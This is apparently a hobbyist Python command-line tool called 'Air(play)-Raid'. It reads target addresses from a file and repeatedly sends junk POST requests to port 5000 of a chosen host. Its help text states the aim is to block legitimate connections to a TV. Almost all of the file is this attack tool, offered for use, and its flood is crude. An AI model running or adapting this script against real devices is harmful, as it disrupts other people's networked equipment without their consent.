
import socket
import time 
target_list = []

import requests

def main() -> None:
    airRaid = AirRaid()

    banner = """
    ¤═══════════════════════¤
    ║    Air(play)-Raid     ║
    ¤═══════════════════════¤
    \u001b[32;1m[H]\u001b[0melp
    \u001b[32;1m[L]\u001b[0mist targets
    \u001b[32;1m[S]\u001b[0melect target
    \u001b[32;1m[A]\u001b[0mttack
    """
    # start program here
    print(banner)
    while True:
        try:
            user_in = input("ඞඞඞ >")
            user_in += " "
            if   user_in.lower()[0] == "h":
                """help"""
                airRaid.help_command()
            elif user_in.lower()[0] == "l":
                """list"""
                airRaid.list_command()
            elif user_in.lower()[0] == "s":
                """select"""
                if len(user_in.split()) > 1:
                    selection = int(user_in.split()[1])
                else:
                    selection = -1
                airRaid.select_command(selection)
            elif user_in.lower()[0] == "a":
                """attack"""
                airRaid.attack_command()
            else:
                print("Unknown option!")


        except KeyboardInterrupt:
            print("\nCya!\n")
            break

class AirRaid:

    def __init__(self) -> None:
        self.target_list = []
        try:
            with open("airraid_targets",'r') as list:
                for line in list:
                        self.target_list.append(line[:len(line)-1])
        except OSError:
            print("Failed to read targets list! Exiting")
            quit()
            
    def help_command(self) -> None:
        print("""
        Air Raid:
            Step 1) (L)ist targets (currently reads from \'targets\' file,
                    direct scanning to be added later)
                    
            Step 2) (S)elect target, enter number 0-n
            
            Step 3) (A)ttack target with bogus packets to
                    block legitimate connection to TV
        """)

    def list_command(self) -> None:
        # applebees
        for idx,item in enumerate(self.target_list):
            try:
                print(str(idx)+")\t\u001b[37;1m"+socket.gethostbyaddr(item)[0]+"\u001b[0m")
            except (socket.gaierror, socket.herror):
                print(str(idx)+")\t\u001b[37;1m"+item+"\u001b[0m")
                

    def select_command(self, sel: int) -> None:
        if sel == -1:
            self.list_command()
            return
        elif sel >= int(len(self.target_list)):
            print("Please enter a valid number for your selection!")
            return
        else:
            self.selection = sel
            try:
                selection_name = socket.gethostbyaddr(self.target_list[self.selection])[0]
            except (socket.gaierror, socket.herror):
                selection_name = self.target_list[self.selection]
            print("Target ["+selection_name+"] has been selected")

    def attack_command(self) -> None:
        if self.selection >= 0:
            print("Launching attack! (Ctrl+C to stop)")
            self.target_url = "http://"+self.target_list[self.selection]+":5000"
            # self.target_url = "http://"+self.target_url[self.target_url.find("172.29"):len(self.target_url)-1]
            # self.target_url += ":5000"
            try:
                while True:
                    requests.post(self.target_url,data = {'deez': 'nuts'})
                    print("Sent POST request to target ["+self.target_url+"]...")
                    time.sleep(1)
            except KeyboardInterrupt:
                print("Stopping attack")
                return
            except requests.exceptions.ConnectionError:
                print("Failed to connect...")
            

if __name__ == "__main__":
    main()
